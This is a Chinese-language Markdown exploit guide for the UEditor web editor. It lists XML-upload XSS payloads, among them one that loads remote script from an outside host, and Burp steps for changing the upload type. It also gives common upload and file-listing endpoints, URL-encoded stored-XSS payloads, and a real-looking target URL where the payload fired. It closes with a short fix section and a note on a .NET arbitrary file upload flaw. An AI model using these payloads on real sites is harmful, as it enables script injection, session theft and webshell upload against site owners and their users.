## Ueditor Exploit

### 1、XML文件上传导致存储型XSS

1、制作一个带有payload的png文件，payload：

<html><head></head><body><something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1);</something:script></body></html>

![Ueditor-1](images\Ueditor-1.png)

2、点击之后选择上传，burp拦截，将uploadimage类型改为uploadfile，并修改文件后缀名为xml。

拦截原始包：

![Ueditor-2](images\Ueditor-2.png)

拦截修改后：

![Ueditor-3](images\Ueditor-3.png)

得到路径，访问即可触发反射型XSS。

![Ueditor-4](images\Ueditor-4.png)

效果如下：

http://121.18.211.82:10003/file/ueditorgroup/baoding/ueditor/jsp/upload/file/20240508/1715154669925044820.xml

![Ueditor-5](images\Ueditor-5.png)

#### 常见的xml弹窗POC：

1、弹窗xss：

<html><head></head><body><something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1);</something:script></body></html>

2、URL跳转：

<html><head></head><body><something:script xmlns:something="http://www.w3.org/1999/xhtml">window.location.href="https://www.t00ls.net/";</something:script></body></html>

3、远程加载Js：

<html><head></head><body><something:script src="http://xss.com/xss.js" xmlns:something="http://www.w3.org/1999/xhtml"></something:script></body></html>

#### 常用的上传路径：

/ueditor/index.html

/ueditor/asp/controller.asp?action=uploadimage

/ueditor/asp/controller.asp?action=uploadfile

/ueditor/net/controller.ashx?action=uploadimage

/ueditor/net/controller.ashx?action=uploadfile

/ueditor/php/controller.php?action=uploadfile

/ueditor/php/controller.php?action=uploadimage

/ueditor/jsp/controller.jsp?action=uploadfile

/ueditor/jsp/controller.jsp?action=uploadimage



**常用的上传路径：**

/ueditor/net/controller.ashx?action=listfile

/ueditor/net/controller.ashx?action=listimage

#### 参考链接：

https://forum.butian.net/share/167

#### 修复方案：

1、修改 xss过滤白名单 配置文件ueditor.config.js，增加白名单过滤，比如对一些非法的参数和标签，像    <>、,",'，img标签的onerror属性，script标签等进行自动转义，或者是强制的拦截并提示。

2、对输入的数据也进行html转义，使其不会识别为可执行脚本。

### 2、另一处XSS

1、存储型XSS需要写入后端数据库，这里要把编辑器部署到一个可与数据库交互的环境中。首先我们打开编辑器输入正常的文本。

2、抓包并将<p>标签以及原本的文本删除，插入payload：

%3Cp%3E1111111"><ImG sRc=1 OnErRoR=prompt(20240509)>%3Cbr%2F%3E%3C%2Fp%3E

%3Cp%3E1111111"><ImG sRc=1 OnErRoR=prompt(20240509)>%3Cbr%2F%3E%3C%2Fp%3E

```
%3Cp%3E1111111"><ImG sRc=20240509 OnErRoR=prompt(20240509)>%3Cbr%2F%3E%3C%2Fp%3E
```









### 3、文件上传漏洞

**1. NET版本文件上传**

该任意文件上传漏洞存在于1.4.3.3、1.5.0和1.3.6版本中，并且只有**.NET**版本受该漏洞影响。黑客可以利用该漏洞上传木马文件，执行命令控制服务器。







